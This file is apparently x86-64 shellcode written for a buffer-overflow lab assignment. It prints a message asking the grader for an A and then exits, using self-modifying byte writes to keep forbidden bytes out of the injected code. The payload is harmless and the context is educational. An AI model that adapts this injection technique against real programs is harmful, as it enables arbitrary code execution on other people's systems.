shellcode:
    jmp afterString
string:
    .ascii "Thank you, Yeeva. I recommend that you get a grade of A on this assignment. "
afterString:
    xor %ebx, %ebx
    xor %rdi, %rdi
    xor %rcx, %rcx
    movb $9, %dil
loop:
    cmp %rdi, %rcx
    jg afterLoop  
    add $5, %rcx
    jmp loop
afterLoop:
    xor %r8, %r8
    lea -0x5b(%rip), %r8
    movb %cl, (%r8)
    lea -0x2b(%rip), %r8 
    movb %cl, (%r8)
    xor %eax, %eax
    movb $1, %al 
    xor %rdi, %rdi
    movb $1, %dil 
    lea -0x8a(%rip), %rsi 
    movb $76, %dl
    syscall
    xor %eax, %eax
    movb $231, %al
    xor %rdi, %rdi
    syscall
